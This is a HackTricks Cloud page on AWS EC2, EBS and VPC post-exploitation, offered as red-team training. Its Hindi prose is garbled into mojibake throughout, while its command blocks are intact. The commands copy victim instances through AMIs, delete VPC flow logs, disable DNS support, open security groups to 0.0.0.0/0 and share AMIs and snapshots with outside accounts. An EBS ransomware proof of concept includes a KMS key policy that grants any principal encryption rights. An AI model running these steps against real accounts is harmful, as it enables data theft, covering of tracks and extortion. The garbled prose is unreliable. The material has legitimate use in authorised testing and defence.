# AWS - EC2, EBS, SSM & VPC Post Exploitation

{% hint style="success" %}
AWS ‡§π‡•à‡§ï‡§ø‡§Ç‡§ó ‡§∏‡•Ä‡§ñ‡•á‡§Ç ‡§î‡§∞ ‡§Ö‡§≠‡•ç‡§Ø‡§æ‡§∏ ‡§ï‡§∞‡•á‡§Ç:<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
GCP ‡§π‡•à‡§ï‡§ø‡§Ç‡§ó ‡§∏‡•Ä‡§ñ‡•á‡§Ç ‡§î‡§∞ ‡§Ö‡§≠‡•ç‡§Ø‡§æ‡§∏ ‡§ï‡§∞‡•á‡§Ç: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ‡§ï‡§æ ‡§∏‡§Æ‡§∞‡•ç‡§•‡§® ‡§ï‡§∞‡•á‡§Ç</summary>

* [**‡§∏‡§¶‡§∏‡•ç‡§Ø‡§§‡§æ ‡§Ø‡•ã‡§ú‡§®‡§æ‡§è‡§Å**](https://github.com/sponsors/carlospolop) ‡§¶‡•á‡§ñ‡•á‡§Ç!
* **‡§π‡§Æ‡§æ‡§∞‡•á** üí¨ [**Discord ‡§∏‡§Æ‡•Ç‡§π**](https://discord.gg/hRep4RUj7f) ‡§Ø‡§æ [**telegram ‡§∏‡§Æ‡•Ç‡§π**](https://t.me/peass) ‡§Æ‡•á‡§Ç ‡§∂‡§æ‡§Æ‡§ø‡§≤ ‡§π‡•ã‡§Ç ‡§Ø‡§æ **Twitter** üê¶ ‡§™‡§∞ ‡§π‡§Æ‡•á‡§Ç **‡§´‡•â‡§≤‡•ã ‡§ï‡§∞‡•á‡§Ç** [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **‡§π‡•à‡§ï‡§ø‡§Ç‡§ó ‡§ü‡•ç‡§∞‡§ø‡§ï‡•ç‡§∏ ‡§∏‡§æ‡§ù‡§æ ‡§ï‡§∞‡•á‡§Ç ‡§î‡§∞** [**HackTricks**](https://github.com/carlospolop/hacktricks) ‡§î‡§∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ‡§ó‡§ø‡§ü‡§π‡§¨ ‡§∞‡§ø‡§™‡•ã‡§ú‡§ø‡§ü‡§∞‡•Ä ‡§Æ‡•á‡§Ç PR ‡§∏‡§¨‡§Æ‡§ø‡§ü ‡§ï‡§∞‡•á‡§Ç‡•§

</details>
{% endhint %}

## EC2 & VPC

‡§Ö‡§ß‡§ø‡§ï ‡§ú‡§æ‡§®‡§ï‡§æ‡§∞‡•Ä ‡§ï‡•á ‡§≤‡§ø‡§è ‡§¶‡•á‡§ñ‡•á‡§Ç:

{% content-ref url="../../aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/" %}
[aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum](../../aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/)
{% endcontent-ref %}

### **‡§¶‡•Å‡§∂‡•ç‡§Æ‡§® VPC ‡§Æ‡§ø‡§∞‡§∞ -** `ec2:DescribeInstances`, `ec2:RunInstances`, `ec2:CreateSecurityGroup`, `ec2:AuthorizeSecurityGroupIngress`, `ec2:CreateTrafficMirrorTarget`, `ec2:CreateTrafficMirrorSession`, `ec2:CreateTrafficMirrorFilter`, `ec2:CreateTrafficMirrorFilterRule`

VPC ‡§ü‡•ç‡§∞‡•à‡§´‡§ø‡§ï ‡§Æ‡§ø‡§∞‡§∞‡§ø‡§Ç‡§ó **VPC ‡§ï‡•á ‡§≠‡•Ä‡§§‡§∞ EC2 ‡§á‡§Ç‡§∏‡•ç‡§ü‡•á‡§Ç‡§∏ ‡§ï‡•á ‡§≤‡§ø‡§è ‡§á‡§®‡§¨‡§æ‡§â‡§Ç‡§° ‡§î‡§∞ ‡§Ü‡§â‡§ü‡§¨‡§æ‡§â‡§Ç‡§° ‡§ü‡•ç‡§∞‡•à‡§´‡§ø‡§ï ‡§ï‡•ã ‡§°‡•Å‡§™‡•ç‡§≤‡§ø‡§ï‡•á‡§ü ‡§ï‡§∞‡§§‡•Ä ‡§π‡•à** ‡§¨‡§ø‡§®‡§æ ‡§á‡§Ç‡§∏‡•ç‡§ü‡•á‡§Ç‡§∏ ‡§™‡§∞ ‡§ï‡•Å‡§õ ‡§≠‡•Ä ‡§á‡§Ç‡§∏‡•ç‡§ü‡•â‡§≤ ‡§ï‡§ø‡§è‡•§ ‡§Ø‡§π ‡§°‡•Å‡§™‡•ç‡§≤‡§ø‡§ï‡•á‡§ü‡•á‡§° ‡§ü‡•ç‡§∞‡•à‡§´‡§ø‡§ï ‡§Ü‡§Æ‡§§‡•å‡§∞ ‡§™‡§∞ ‡§µ‡§ø‡§∂‡•ç‡§≤‡•á‡§∑‡§£ ‡§î‡§∞ ‡§®‡§ø‡§ó‡§∞‡§æ‡§®‡•Ä ‡§ï‡•á ‡§≤‡§ø‡§è ‡§®‡•á‡§ü‡§µ‡§∞‡•ç‡§ï ‡§á‡§Ç‡§ü‡•ç‡§∞‡•Ç‡§ú‡§® ‡§°‡§ø‡§ü‡•á‡§ï‡•ç‡§∂‡§® ‡§∏‡§ø‡§∏‡•ç‡§ü‡§Æ (IDS) ‡§ú‡•à‡§∏‡•Ä ‡§ï‡§ø‡§∏‡•Ä ‡§ö‡•Ä‡§ú‡§º ‡§™‡§∞ ‡§≠‡•á‡§ú‡§æ ‡§ú‡§æ‡§è‡§ó‡§æ‡•§\
‡§è‡§ï ‡§π‡§Æ‡§≤‡§æ‡§µ‡§∞ ‡§á‡§∏‡§ï‡§æ ‡§¶‡•Å‡§∞‡•Å‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§ï‡•á ‡§∏‡§≠‡•Ä ‡§ü‡•ç‡§∞‡•à‡§´‡§ø‡§ï ‡§ï‡•ã ‡§ï‡•à‡§™‡•ç‡§ö‡§∞ ‡§ï‡§∞ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à ‡§î‡§∞ ‡§á‡§∏‡§∏‡•á ‡§∏‡§Ç‡§µ‡•á‡§¶‡§®‡§∂‡•Ä‡§≤ ‡§ú‡§æ‡§®‡§ï‡§æ‡§∞‡•Ä ‡§™‡•ç‡§∞‡§æ‡§™‡•ç‡§§ ‡§ï‡§∞ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à:

‡§Ö‡§ß‡§ø‡§ï ‡§ú‡§æ‡§®‡§ï‡§æ‡§∞‡•Ä ‡§ï‡•á ‡§≤‡§ø‡§è ‡§á‡§∏ ‡§™‡•É‡§∑‡•ç‡§† ‡§ï‡•ã ‡§¶‡•á‡§ñ‡•á‡§Ç:

{% content-ref url="aws-malicious-vpc-mirror.md" %}
[aws-malicious-vpc-mirror.md](aws-malicious-vpc-mirror.md)
{% endcontent-ref %}

### ‡§ö‡§≤ ‡§∞‡§π‡•á ‡§á‡§Ç‡§∏‡•ç‡§ü‡•á‡§Ç‡§∏ ‡§ï‡•Ä ‡§ï‡•â‡§™‡•Ä

‡§á‡§Ç‡§∏‡•ç‡§ü‡•á‡§Ç‡§∏ ‡§Ü‡§Æ‡§§‡•å‡§∞ ‡§™‡§∞ ‡§ï‡•Å‡§õ ‡§™‡•ç‡§∞‡§ï‡§æ‡§∞ ‡§ï‡•Ä ‡§∏‡§Ç‡§µ‡•á‡§¶‡§®‡§∂‡•Ä‡§≤ ‡§ú‡§æ‡§®‡§ï‡§æ‡§∞‡•Ä ‡§∞‡§ñ‡§§‡•á ‡§π‡•à‡§Ç‡•§ ‡§Ö‡§Ç‡§¶‡§∞ ‡§ú‡§æ‡§®‡•á ‡§ï‡•á ‡§µ‡§ø‡§≠‡§ø‡§®‡•ç‡§® ‡§§‡§∞‡•Ä‡§ï‡•á ‡§π‡•à‡§Ç (‡§¶‡•á‡§ñ‡•á‡§Ç [EC2 ‡§µ‡§ø‡§∂‡•á‡§∑‡§æ‡§ß‡§ø‡§ï‡§æ‡§∞ ‡§µ‡•É‡§¶‡•ç‡§ß‡§ø ‡§ü‡•ç‡§∞‡§ø‡§ï‡•ç‡§∏](../../aws-privilege-escalation/aws-ec2-privesc.md))‡•§ ‡§π‡§æ‡§≤‡§æ‡§Å‡§ï‡§ø, ‡§Ø‡§π ‡§¶‡•á‡§ñ‡§®‡•á ‡§ï‡§æ ‡§è‡§ï ‡§î‡§∞ ‡§§‡§∞‡•Ä‡§ï‡§æ ‡§π‡•à ‡§ï‡§ø ‡§á‡§∏‡§Æ‡•á‡§Ç ‡§ï‡•ç‡§Ø‡§æ ‡§π‡•à, **‡§è‡§ï AMI ‡§¨‡§®‡§æ‡§®‡§æ ‡§î‡§∞ ‡§á‡§∏‡§∏‡•á ‡§è‡§ï ‡§®‡§Ø‡§æ ‡§á‡§Ç‡§∏‡•ç‡§ü‡•á‡§Ç‡§∏ ‡§ö‡§≤‡§æ‡§®‡§æ (‡§Ø‡§π‡§æ‡§Å ‡§§‡§ï ‡§ï‡§ø ‡§Ö‡§™‡§®‡•á ‡§∏‡•ç‡§µ‡§Ø‡§Ç ‡§ï‡•á ‡§ñ‡§æ‡§§‡•á ‡§Æ‡•á‡§Ç)**:
```shell
# List instances
aws ec2 describe-images

# create a new image for the instance-id
aws ec2 create-image --instance-id i-0438b003d81cd7ec5 --name "AWS Audit" --description "Export AMI" --region eu-west-1

# add key to AWS
aws ec2 import-key-pair --key-name "AWS Audit" --public-key-material file://~/.ssh/id_rsa.pub --region eu-west-1

# create ec2 using the previously created AMI, use the same security group and subnet to connect easily.
aws ec2 run-instances --image-id ami-0b77e2d906b00202d --security-group-ids "sg-6d0d7f01" --subnet-id subnet-9eb001ea --count 1 --instance-type t2.micro --key-name "AWS Audit" --query "Instances[0].InstanceId" --region eu-west-1

# now you can check the instance
aws ec2 describe-instances --instance-ids i-0546910a0c18725a1

# If needed : edit groups
aws ec2 modify-instance-attribute --instance-id "i-0546910a0c18725a1" --groups "sg-6d0d7f01"  --region eu-west-1

# be a good guy, clean our instance to avoid any useless cost
aws ec2 stop-instances --instance-id "i-0546910a0c18725a1" --region eu-west-1
aws ec2 terminate-instances --instance-id "i-0546910a0c18725a1" --region eu-west-1
```
### EBS Snapshot dump

**Snapshots ‡§π‡•à‡§Ç ‡§µ‡•â‡§≤‡•ç‡§Ø‡•Ç‡§Æ ‡§ï‡•á ‡§¨‡•à‡§ï‡§Ö‡§™**, ‡§ú‡•ã ‡§Ü‡§Æ‡§§‡•å‡§∞ ‡§™‡§∞ **‡§∏‡§Ç‡§µ‡•á‡§¶‡§®‡§∂‡•Ä‡§≤ ‡§ú‡§æ‡§®‡§ï‡§æ‡§∞‡•Ä** ‡§∞‡§ñ‡•á‡§Ç‡§ó‡•á, ‡§á‡§∏‡§≤‡§ø‡§è ‡§á‡§®‡•ç‡§π‡•á‡§Ç ‡§ö‡•á‡§ï ‡§ï‡§∞‡§®‡•á ‡§∏‡•á ‡§Ø‡§π ‡§ú‡§æ‡§®‡§ï‡§æ‡§∞‡•Ä ‡§™‡•ç‡§∞‡§ï‡§ü ‡§π‡•ã‡§®‡•Ä ‡§ö‡§æ‡§π‡§ø‡§è‡•§\
‡§Ø‡§¶‡§ø ‡§Ü‡§™ ‡§è‡§ï **‡§µ‡•â‡§≤‡•ç‡§Ø‡•Ç‡§Æ ‡§¨‡§ø‡§®‡§æ ‡§∏‡•ç‡§®‡•à‡§™‡§∂‡•â‡§ü** ‡§ï‡•á ‡§™‡§æ‡§§‡•á ‡§π‡•à‡§Ç, ‡§§‡•ã ‡§Ü‡§™: **‡§è‡§ï ‡§∏‡•ç‡§®‡•à‡§™‡§∂‡•â‡§ü ‡§¨‡§®‡§æ‡§è‡§Å** ‡§î‡§∞ ‡§®‡§ø‡§Æ‡•ç‡§®‡§≤‡§ø‡§ñ‡§ø‡§§ ‡§ï‡•ç‡§∞‡§ø‡§Ø‡§æ‡§è‡§Å ‡§ï‡§∞‡•á‡§Ç ‡§Ø‡§æ ‡§¨‡§∏ **‡§á‡§∏‡•á ‡§è‡§ï ‡§á‡§Ç‡§∏‡•ç‡§ü‡•á‡§Ç‡§∏ ‡§Æ‡•á‡§Ç ‡§Æ‡§æ‡§â‡§Ç‡§ü ‡§ï‡§∞‡•á‡§Ç** ‡§ñ‡§æ‡§§‡•á ‡§ï‡•á ‡§Ö‡§Ç‡§¶‡§∞:

{% content-ref url="aws-ebs-snapshot-dump.md" %}
[aws-ebs-snapshot-dump.md](aws-ebs-snapshot-dump.md)
{% endcontent-ref %}

### Data Exfiltration

#### DNS Exfiltration

‡§≠‡§≤‡•á ‡§π‡•Ä ‡§Ü‡§™ ‡§è‡§ï EC2 ‡§ï‡•ã ‡§á‡§∏ ‡§§‡§∞‡§π ‡§≤‡•â‡§ï ‡§ï‡§∞ ‡§¶‡•á‡§Ç ‡§ï‡§ø ‡§ï‡•ã‡§à ‡§ü‡•ç‡§∞‡•à‡§´‡§ø‡§ï ‡§¨‡§æ‡§π‡§∞ ‡§® ‡§ú‡§æ ‡§∏‡§ï‡•á, ‡§Ø‡§π ‡§Ö‡§≠‡•Ä ‡§≠‡•Ä **DNS ‡§ï‡•á ‡§Æ‡§æ‡§ß‡•ç‡§Ø‡§Æ ‡§∏‡•á ‡§è‡§ï‡•ç‡§∏‡§´‡§ø‡§≤‡•ç‡§ü‡•ç‡§∞‡•á‡§ü** ‡§ï‡§∞ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à‡•§

* **VPC ‡§´‡•ç‡§≤‡•ã ‡§≤‡•â‡§ó ‡§á‡§∏‡•á ‡§∞‡§ø‡§ï‡•â‡§∞‡•ç‡§° ‡§®‡§π‡•Ä‡§Ç ‡§ï‡§∞‡•á‡§Ç‡§ó‡•á**‡•§
* ‡§Ü‡§™‡§ï‡•á ‡§™‡§æ‡§∏ AWS DNS ‡§≤‡•â‡§ó ‡§ï‡§æ ‡§ï‡•ã‡§à ‡§è‡§ï‡•ç‡§∏‡•á‡§∏ ‡§®‡§π‡•Ä‡§Ç ‡§π‡•à‡•§
*   ‡§á‡§∏‡•á "enableDnsSupport" ‡§ï‡•ã false ‡§∏‡•á‡§ü ‡§ï‡§∞‡§ï‡•á ‡§¨‡§Ç‡§¶ ‡§ï‡§∞‡•á‡§Ç:

`aws ec2 modify-vpc-attribute --no-enable-dns-support --vpc-id <vpc-id>`

#### Exfiltration via API calls

‡§è‡§ï ‡§π‡§Æ‡§≤‡§æ‡§µ‡§∞ ‡§è‡§ï ‡§ñ‡§æ‡§§‡•á ‡§ï‡•á API ‡§è‡§Ç‡§°‡§™‡•â‡§á‡§Ç‡§ü‡•ç‡§∏ ‡§ï‡•ã ‡§ï‡•â‡§≤ ‡§ï‡§∞ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à ‡§ú‡§ø‡§∏‡•á ‡§µ‡§π ‡§®‡§ø‡§Ø‡§Ç‡§§‡•ç‡§∞‡§ø‡§§ ‡§ï‡§∞‡§§‡§æ ‡§π‡•à‡•§ ‡§ï‡•ç‡§≤‡§æ‡§â‡§°‡§ü‡•ç‡§∞‡•á‡§≤ ‡§á‡§® ‡§ï‡•â‡§≤‡•ç‡§∏ ‡§ï‡•ã ‡§≤‡•â‡§ó ‡§ï‡§∞‡•á‡§ó‡§æ ‡§î‡§∞ ‡§π‡§Æ‡§≤‡§æ‡§µ‡§∞ ‡§ï‡•ç‡§≤‡§æ‡§â‡§°‡§ü‡•ç‡§∞‡•á‡§≤ ‡§≤‡•â‡§ó ‡§Æ‡•á‡§Ç ‡§è‡§ï‡•ç‡§∏‡§´‡§ø‡§≤‡•ç‡§ü‡•ç‡§∞‡•á‡§ü ‡§°‡•á‡§ü‡§æ ‡§¶‡•á‡§ñ ‡§∏‡§ï‡•á‡§ó‡§æ‡•§

### Open Security Group

‡§Ü‡§™ ‡§á‡§∏ ‡§§‡§∞‡§π ‡§™‡•ã‡§∞‡•ç‡§ü ‡§ñ‡•ã‡§≤‡§ï‡§∞ ‡§®‡•á‡§ü‡§µ‡§∞‡•ç‡§ï ‡§∏‡•á‡§µ‡§æ‡§ì‡§Ç ‡§§‡§ï ‡§Ü‡§ó‡•á ‡§ï‡•Ä ‡§™‡§π‡•Å‡§Å‡§ö ‡§™‡•ç‡§∞‡§æ‡§™‡•ç‡§§ ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç:

{% code overflow="wrap" %}
```bash
aws ec2 authorize-security-group-ingress --group-id <sg-id> --protocol tcp --port 80 --cidr 0.0.0.0/0
# Or you could just open it to more specific ips or maybe th einternal network if you have already compromised an EC2 in the VPC
```
{% endcode %}

### ECS ‡§ï‡•á ‡§≤‡§ø‡§è ‡§™‡•ç‡§∞‡§ø‡§µ‡•á‡§∏‡•ç‡§ï

‡§è‡§ï EC2 ‡§á‡§Ç‡§∏‡•ç‡§ü‡•á‡§Ç‡§∏ ‡§ö‡§≤‡§æ‡§®‡§æ ‡§î‡§∞ ‡§á‡§∏‡•á ECS ‡§á‡§Ç‡§∏‡•ç‡§ü‡•á‡§Ç‡§∏ ‡§ö‡§≤‡§æ‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§™‡§Ç‡§ú‡•Ä‡§ï‡•É‡§§ ‡§ï‡§∞‡§®‡§æ ‡§∏‡§Ç‡§≠‡§µ ‡§π‡•à ‡§î‡§∞ ‡§´‡§ø‡§∞ ECS ‡§á‡§Ç‡§∏‡•ç‡§ü‡•á‡§Ç‡§∏ ‡§ï‡•á ‡§°‡•á‡§ü‡§æ ‡§ï‡•ã ‡§ö‡•Å‡§∞‡§æ‡§®‡§æ‡•§

[**‡§Ö‡§ß‡§ø‡§ï ‡§ú‡§æ‡§®‡§ï‡§æ‡§∞‡•Ä ‡§ï‡•á ‡§≤‡§ø‡§è ‡§á‡§∏‡•á ‡§¶‡•á‡§ñ‡•á‡§Ç**](../../aws-privilege-escalation/aws-ec2-privesc.md#privesc-to-ecs)‡•§

### VPC ‡§´‡•ç‡§≤‡•ã ‡§≤‡•â‡§ó ‡§π‡§ü‡§æ‡§è‡§Ç
```bash
aws ec2 delete-flow-logs --flow-log-ids <flow_log_ids> --region <region>
```
### AMI ‡§∏‡§æ‡§ù‡§æ ‡§ï‡§∞‡•á‡§Ç

{% code overflow="wrap" %}
```bash
aws ec2 modify-image-attribute --image-id <image_ID> --launch-permission "Add=[{UserId=<recipient_account_ID>}]" --region <AWS_region>
```
### EBS ‡§∏‡•ç‡§®‡•à‡§™‡§∂‡•â‡§ü ‡§∏‡§æ‡§ù‡§æ ‡§ï‡§∞‡•á‡§Ç

{% code overflow="wrap" %}
```bash
aws ec2 modify-snapshot-attribute --snapshot-id <snapshot_ID> --create-volume-permission "Add=[{UserId=<recipient_account_ID>}]" --region <AWS_region>
```
{% endcode %}

### EBS Ransomware PoC

‡§è‡§ï ‡§™‡•ç‡§∞‡§Æ‡§æ‡§£‡§ø‡§§ ‡§Ö‡§µ‡§ß‡§æ‡§∞‡§£‡§æ ‡§ú‡•ã S3 ‡§™‡•ã‡§∏‡•ç‡§ü-‡§è‡§ï‡•ç‡§∏‡§™‡•ç‡§≤‡•ã‡§á‡§ü‡•á‡§∂‡§® ‡§®‡•ã‡§ü‡•ç‡§∏ ‡§Æ‡•á‡§Ç ‡§™‡•ç‡§∞‡§¶‡§∞‡•ç‡§∂‡§ø‡§§ ‡§∞‡•à‡§Ç‡§∏‡§Æ‡§µ‡•á‡§Ø‡§∞ ‡§™‡•ç‡§∞‡§¶‡§∞‡•ç‡§∂‡§® ‡§ï‡•á ‡§∏‡§Æ‡§æ‡§® ‡§π‡•à‡•§ KMS ‡§ï‡•ã ‡§∞‡•à‡§Ç‡§∏‡§Æ‡§µ‡•á‡§Ø‡§∞ ‡§™‡•ç‡§∞‡§¨‡§Ç‡§ß‡§® ‡§∏‡•á‡§µ‡§æ (RMS) ‡§ï‡•á ‡§≤‡§ø‡§è ‡§™‡•Å‡§®‡§É ‡§®‡§æ‡§Æ‡§ø‡§§ ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§®‡§æ ‡§ö‡§æ‡§π‡§ø‡§è, ‡§ï‡•ç‡§Ø‡•ã‡§Ç‡§ï‡§ø ‡§á‡§∏‡•á ‡§µ‡§ø‡§≠‡§ø‡§®‡•ç‡§® AWS ‡§∏‡•á‡§µ‡§æ‡§ì‡§Ç ‡§ï‡•ã ‡§è‡§®‡•ç‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§ü ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§®‡§æ ‡§ï‡§ø‡§§‡§®‡§æ ‡§Ü‡§∏‡§æ‡§® ‡§π‡•à‡•§

‡§™‡§π‡§≤‡•á '‡§π‡§Æ‡§≤‡§æ‡§µ‡§∞' AWS ‡§ñ‡§æ‡§§‡•á ‡§∏‡•á, KMS ‡§Æ‡•á‡§Ç ‡§è‡§ï ‡§ó‡•ç‡§∞‡§æ‡§π‡§ï ‡§™‡•ç‡§∞‡§¨‡§Ç‡§ß‡§ø‡§§ ‡§ï‡•Å‡§Ç‡§ú‡•Ä ‡§¨‡§®‡§æ‡§è‡§Ç‡•§ ‡§á‡§∏ ‡§â‡§¶‡§æ‡§π‡§∞‡§£ ‡§ï‡•á ‡§≤‡§ø‡§è, ‡§π‡§Æ ‡§¨‡§∏ AWS ‡§ï‡•ã ‡§Æ‡•á‡§∞‡•á ‡§≤‡§ø‡§è ‡§ï‡•Å‡§Ç‡§ú‡•Ä ‡§°‡•á‡§ü‡§æ ‡§™‡•ç‡§∞‡§¨‡§Ç‡§ß‡§ø‡§§ ‡§ï‡§∞‡§®‡•á ‡§¶‡•á‡§Ç‡§ó‡•á, ‡§≤‡•á‡§ï‡§ø‡§® ‡§è‡§ï ‡§µ‡§æ‡§∏‡•ç‡§§‡§µ‡§ø‡§ï ‡§™‡§∞‡§ø‡§¶‡•É‡§∂‡•ç‡§Ø ‡§Æ‡•á‡§Ç, ‡§è‡§ï ‡§¶‡•Å‡§∞‡•ç‡§≠‡§æ‡§µ‡§®‡§æ‡§™‡•Ç‡§∞‡•ç‡§£ ‡§Ö‡§≠‡§ø‡§®‡•á‡§§‡§æ AWS ‡§ï‡•á ‡§®‡§ø‡§Ø‡§Ç‡§§‡•ç‡§∞‡§£ ‡§∏‡•á ‡§¨‡§æ‡§π‡§∞ ‡§ï‡•Å‡§Ç‡§ú‡•Ä ‡§°‡•á‡§ü‡§æ ‡§ï‡•ã ‡§¨‡§®‡§æ‡§è ‡§∞‡§ñ‡•á‡§ó‡§æ‡•§ ‡§ï‡•Å‡§Ç‡§ú‡•Ä ‡§®‡•Ä‡§§‡§ø ‡§ï‡•ã ‡§á‡§∏ ‡§™‡•ç‡§∞‡§ï‡§æ‡§∞ ‡§¨‡§¶‡§≤‡•á‡§Ç ‡§ï‡§ø ‡§ï‡§ø‡§∏‡•Ä ‡§≠‡•Ä AWS ‡§ñ‡§æ‡§§‡§æ ‡§™‡•ç‡§∞‡§ø‡§Ç‡§∏‡§ø‡§™‡§≤ ‡§ï‡•ã ‡§ï‡•Å‡§Ç‡§ú‡•Ä ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§®‡•á ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§π‡•ã‡•§ ‡§á‡§∏ ‡§ï‡•Å‡§Ç‡§ú‡•Ä ‡§®‡•Ä‡§§‡§ø ‡§ï‡•á ‡§≤‡§ø‡§è, ‡§ñ‡§æ‡§§‡•á ‡§ï‡§æ ‡§®‡§æ‡§Æ 'AttackSim' ‡§•‡§æ ‡§î‡§∞ ‡§∏‡§≠‡•Ä ‡§™‡§π‡•Å‡§Ç‡§ö ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§¶‡•á‡§®‡•á ‡§µ‡§æ‡§≤‡§æ ‡§®‡•Ä‡§§‡§ø ‡§®‡§ø‡§Ø‡§Æ '‡§¨‡§æ‡§π‡§∞‡•Ä ‡§è‡§®‡•ç‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§∂‡§®' ‡§ï‡§π‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à‡•§
```
{
"Version": "2012-10-17",
"Id": "key-consolepolicy-3",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:root"
},
"Action": "kms:*",
"Resource": "*"
},
{
"Sid": "Allow access for Key Administrators",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Create*",
"kms:Describe*",
"kms:Enable*",
"kms:List*",
"kms:Put*",
"kms:Update*",
"kms:Revoke*",
"kms:Disable*",
"kms:Get*",
"kms:Delete*",
"kms:TagResource",
"kms:UntagResource",
"kms:ScheduleKeyDeletion",
"kms:CancelKeyDeletion"
],
"Resource": "*"
},
{
"Sid": "Allow use of the key",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*"
},
{
"Sid": "Outside Encryption",
"Effect": "Allow",
"Principal": {
"AWS": "*"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey",
"kms:GenerateDataKeyWithoutPlainText",
"kms:CreateGrant"
],
"Resource": "*"
},
{
"Sid": "Allow attachment of persistent resources",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:CreateGrant",
"kms:ListGrants",
"kms:RevokeGrant"
],
"Resource": "*",
"Condition": {
"Bool": {
"kms:GrantIsForAWSResource": "true"
}
}
}
]
}
```
The key policy rule needs the following enabled to allow for the ability to use it to encrypt an EBS volume:

* `kms:CreateGrant`
* `kms:Decrypt`
* `kms:DescribeKey`
* `kms:GenerateDataKeyWithoutPlainText`
* `kms:ReEncrypt`

‡§Ö‡§¨ ‡§∏‡§æ‡§∞‡•ç‡§µ‡§ú‡§®‡§ø‡§ï ‡§∞‡•Ç‡§™ ‡§∏‡•á ‡§∏‡•Å‡§≤‡§≠ ‡§ï‡•Å‡§Ç‡§ú‡•Ä ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§∏‡§æ‡§•‡•§ ‡§π‡§Æ ‡§è‡§ï '‡§™‡•Ä‡§°‡§º‡§ø‡§§' ‡§ñ‡§æ‡§§‡•á ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç ‡§ú‡§ø‡§∏‡§Æ‡•á‡§Ç ‡§ï‡•Å‡§õ EC2 ‡§â‡§¶‡§æ‡§π‡§∞‡§£ ‡§π‡•à‡§Ç ‡§ú‡§ø‡§®‡§∏‡•á ‡§Ö‡§®‡§è‡§®‡•ç‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§ü‡•á‡§° EBS ‡§µ‡•â‡§≤‡•ç‡§Ø‡•Ç‡§Æ ‡§ú‡•Å‡§°‡§º‡•á ‡§π‡•Å‡§è ‡§π‡•à‡§Ç‡•§ ‡§á‡§∏ '‡§™‡•Ä‡§°‡§º‡§ø‡§§' ‡§ñ‡§æ‡§§‡•á ‡§ï‡•á EBS ‡§µ‡•â‡§≤‡•ç‡§Ø‡•Ç‡§Æ ‡§µ‡§π ‡§π‡•à‡§Ç ‡§ú‡§ø‡§®‡§ï‡§æ ‡§π‡§Æ ‡§è‡§®‡•ç‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§∂‡§® ‡§ï‡•á ‡§≤‡§ø‡§è ‡§≤‡§ï‡•ç‡§∑‡•ç‡§Ø ‡§¨‡§®‡§æ ‡§∞‡§π‡•á ‡§π‡•à‡§Ç, ‡§Ø‡§π ‡§π‡§Æ‡§≤‡§æ ‡§è‡§ï ‡§â‡§ö‡•ç‡§ö-‡§µ‡§ø‡§∂‡•á‡§∑‡§æ‡§ß‡§ø‡§ï‡§æ‡§∞ AWS ‡§ñ‡§æ‡§§‡•á ‡§ï‡•á ‡§â‡§≤‡•ç‡§≤‡§Ç‡§ò‡§® ‡§ï‡•á ‡§§‡§π‡§§ ‡§π‡•à‡•§

![Pasted image 20231231172655](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/5b9a96cd-6006-4965-84a4-b090456f90c6) ![Pasted image 20231231172734](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/4294289c-0dbd-4eb6-a484-60b4e4266459)

